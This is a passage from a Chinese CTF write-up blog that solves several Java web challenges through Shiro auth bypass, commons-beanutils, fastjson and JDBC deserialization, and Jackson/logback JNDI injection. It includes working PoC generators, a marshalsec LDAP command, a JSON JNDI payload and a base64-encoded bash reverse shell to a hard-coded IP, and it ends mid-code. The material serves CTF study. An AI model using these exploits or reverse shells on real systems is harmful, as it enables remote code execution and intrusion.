function_">adminRealm</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">AdminRealm</span>();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>反序列化入口需要鉴权</p><p>去搜一下</p><p><a href="https://mvnrepository.com/artifact/org.apache.shiro/shiro-core/1.5.2">https://mvnrepository.com/artifact/org.apache.shiro/shiro-core/1.5.2</a></p><p>存在<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11989">CVE-2020-11989</a>分号绕过鉴权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/web;/admin/hello</span><br></pre></td></tr></table></figure><p>这样鉴权就解决了, 再看一下源码中的过滤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.butler.springboot14shiro.Util;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectStreamClass;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> ArrayList&lt;String&gt; blackList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">MyObjectInputStream</span><span class="params">(InputStream inputStream)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">      <span class="built_in">super</span>(inputStream);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">      <span class="type">Iterator</span> <span class="variable">var2</span> <span class="operator">=</span> blackList.iterator();</span><br><span class="line"></span><br><span class="line">      String s;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">         <span class="keyword">if</span> (!var2.hasNext()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         s = (String)var2.next();</span><br><span class="line">      &#125; <span class="keyword">while</span>(!desc.getName().contains(s));</span><br><span class="line"></span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&quot;Don&#x27;t hacker!&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">static</span> &#123;</span><br><span class="line">      blackList.add(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.traxTemplatesImpl&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;org.hibernate.tuple.component.PojoComponentTuplizer&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;java.security.SignedObject&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">com.sun.org.apache.xalan.internal.xsltc.traxTemplatesImpl</span><br><span class="line">org.hibernate.tuple.component.PojoComponentTuplizer</span><br><span class="line">java.security.SignedObject</span><br><span class="line">com.sun.rowset.JdbcRowSetImpl</span><br></pre></td></tr></table></figure><p>用来防御<code>Hibernate</code>反序列化链和<code>Jdbc</code>反序列化链</p><p>不过这里Shrio内置了<code>commons-beanutils1.9.4</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240819134609766.png" alt="image-20240819134609766"></p><p>可以直接打CB链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"><span class="keyword">import</span> org.n4c1.Tools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">poc</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] codes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\CTF_DOC\\练习tmp\\[MTCTF2022]easyjava\\easyjava\\target\\test-classes\\evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] evil = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;codes&#125;;</span><br><span class="line">        Tools.setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line">        Tools.setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        PropertyUtils.getProperty(templates, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, beanComparator);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        Tools.setFieldValue(priorityQueue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, <span class="number">1</span>&#125;);</span><br><span class="line">        Tools.setFieldValue(beanComparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        Tools.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, evil);</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> Tools.serialize2base64(priorityQueue);</span><br><span class="line">        Tools.string2file(poc, <span class="string">&quot;poc.txt&quot;</span>);</span><br><span class="line">        Tools.InspectB64Poc(<span class="string">&quot;poc.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看题目讨论这题环境有问题, 这里本地过了</p><h2 id="羊城杯-2020-a-piece-of-java"><a href="#羊城杯-2020-a-piece-of-java" class="headerlink" title="[羊城杯 2020]a_piece_of_java"></a>[羊城杯 2020]a_piece_of_java</h2><p>查看源码, <code>MainController</code>中的<code>/hello</code>路由对cookie进行了反序列化</p><p>再看一下这个自定义的反序列化方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Object <span class="title function_">deserialize</span><span class="params">(String base64data)</span> &#123;</span><br><span class="line">    <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(base64data));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SerialKiller</span>(bais, <span class="string">&quot;serialkiller.conf&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">        var5.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用了一个SerialKiller来反序列化, 去看一下他使用的serialkiller.conf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!-- serialkiller.conf --&gt;</span><br><span class="line">&lt;config&gt;</span><br><span class="line">    &lt;refresh&gt;6000&lt;/refresh&gt;</span><br><span class="line">    &lt;mode&gt;</span><br><span class="line">        &lt;!-- set to &#x27;false&#x27; for blocking mode --&gt;</span><br><span class="line">        &lt;profiling&gt;false&lt;/profiling&gt;</span><br><span class="line">    &lt;/mode&gt;</span><br><span class="line">    &lt;blacklist&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/blacklist&gt;</span><br><span class="line">    &lt;whitelist&gt;</span><br><span class="line">        &lt;regexp&gt;gdufs\..*&lt;/regexp&gt;</span><br><span class="line">        &lt;regexp&gt;java\.lang\..*&lt;/regexp&gt;</span><br><span class="line">    &lt;/whitelist&gt;</span><br><span class="line">&lt;/config&gt;</span><br></pre></td></tr></table></figure><p>白名单gdufs和java.lang</p><p>这样一来, 虽然我们在lib目录下看见了<code>Common-collections3.2.1</code>的依赖, 但由于这里的白名单就没办法直接打CC链了(并且SerialKiller自带对cc依赖中恶意类的过滤)</p><p>既然让打gdufs, 那就去gdufs找切入点</p><p>在gdufs.challenge.web.model.DatabaseInfo中发现</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240821233124059.png" alt="image-20240821233124059"></p><p>它实现了Info接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> gdufs.challenge.web.model;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: web-0.0.1-SNAPSHOT.jar:BOOT-INF/classes/gdufs/challenge/web/model/Info.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Info</span> &#123;</span><br><span class="line">    Boolean <span class="title function_">checkAllInfo</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">getAllInfo</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的connect可以打jdbc, 他分别被getConnection和checkAllInfo调用, 那么接下来就是寻找同名方法</p><p>在<code>gdufs.challenge.web.invocation</code>中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span> <span class="comment">// java.lang.reflect.InvocationHandler</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;getAllInfo&quot;</span>) &amp;&amp; !<span class="built_in">this</span>.info.checkAllInfo().booleanValue()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> method.invoke(<span class="built_in">this</span>.info, args);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重写的invoke方法中调用了checkAllInfo且调用者可控</p><p>这个类继承<code>java.lang.reflect.InvocationHandler</code>, 他是一个动态代理的handler, 我们只需要给<code>DatabaseInfo</code>类套一层动态代理, 反序列化后invoke就会被执行, 进而调用connect, 然后伪造sever打cc链</p><p>注意由于spring boot项目的包结构导致无法直接导入jar包然后<code>import gdufs.challenge.web.model.DatabaseInfo</code>等, 这里我手动创建了需要的类并导入题目jar包的依赖</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240822141801157.png" alt="image-20240822141801157"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.invocation.InfoInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.model.DatabaseInfo;</span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.model.Info;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.Tools.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">DatabaseInfo</span> <span class="variable">databaseInfo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatabaseInfo</span>();</span><br><span class="line">        databaseInfo.setUsername(<span class="string">&quot;yso_CommonsCollections1_calc&quot;</span>);</span><br><span class="line">        databaseInfo.setHost(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">        databaseInfo.setPort(<span class="string">&quot;3306&quot;</span>);</span><br><span class="line">        databaseInfo.setPassword(<span class="string">&quot;1&amp;autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">InfoInvocationHandler</span> <span class="variable">infoInvocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InfoInvocationHandler</span>(databaseInfo);</span><br><span class="line">        <span class="type">Info</span> <span class="variable">info</span> <span class="operator">=</span> (Info) Proxy.newProxyInstance(databaseInfo.getClass().getClassLoader(), databaseInfo.getClass().getInterfaces(), infoInvocationHandler);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> serialize2base64(info);</span><br><span class="line">        string2file(poc, <span class="string">&quot;poc.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>伪造mysql服务器</p><p><a href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a></p><p>这里本地能打通cc, 不i知道为什么弹不了shell</p><p>最后用jdbc文件读取了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">databaseInfo.setPassword(<span class="string">&quot;1&amp;autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;allowLoadLocalInfile=true&amp;allowUrlInLocalInfile=true&amp;maxAllowedPacket=655360&quot;</span>);</span><br><span class="line">databaseInfo.setUsername(<span class="string">&quot;fileread_/flag&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240822153453150.png" alt="image-20240822153453150"></p><h2 id="红明谷CTF-2021-JavaWeb"><a href="#红明谷CTF-2021-JavaWeb" class="headerlink" title="[红明谷CTF 2021]JavaWeb"></a>[红明谷CTF 2021]JavaWeb</h2><p>提示<code>/login</code>, 访问后返回<code>/json</code>, 不难看出为shiro</p><p><code>/json</code>不能直接访问, 可以用shiro常用的方法绕过鉴权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /;/json HTTP/1.1</span><br></pre></td></tr></table></figure><p>传入json数据可以看见报错, wp说是jackson的报错</p><p>打<code>ch.qos.logback.core.db.JNDIConnectionSource</code> jndi注入</p><p>恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">reverse_shell_static</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDcuMTQ4Ljc1LjIwMi8xMjM0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;evil!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.di.LDAPRefServer http://107.148.75.202:8000/#reverse_shell_static 1389</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/;/json</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>1fa50337-4466-472a-83f9-b61579c102f1.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>101</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"></span><br><span class="line"><span class="language-css"><span class="selector-attr">[<span class="string">&quot;ch.qos.logback.core.db.JNDIConnectionSource&quot;</span>,&#123;<span class="string">&quot;jndiLocation&quot;</span>:<span class="string">&quot;ldap://107.148.75.202:1389/Exploit&quot;</span>&#125;]</span></span></span><br></pre></td></tr></table></figure><h2 id="HZNUCTF-2023-easyjava"><a href="#HZNUCTF-2023-easyjava" class="headerlink" title="[HZNUCTF 2023]easyjava"></a>[HZNUCTF 2023]easyjava</h2><p>进去提示 fastjson1.2.48 </p><p>log4j2配合fastjson1.2.48 原生反序列化</p><p>fastjson反序列化poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.Tools.*;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.ShellCode.getEvilTemplatesImpl;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Unserial_1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> getEvilTemplatesImpl(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDcuMTQ4Ljc1LjIwMi8xMjM0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">val</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">valfield</span> <span class="operator">=</span> val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        valfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        valfield.set(val, jsonArray);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> serialize2base64(val);</span><br><span class="line">        string2file(poc, <span class="string">&quot;Unserial_1.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>伪造ldap server</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span 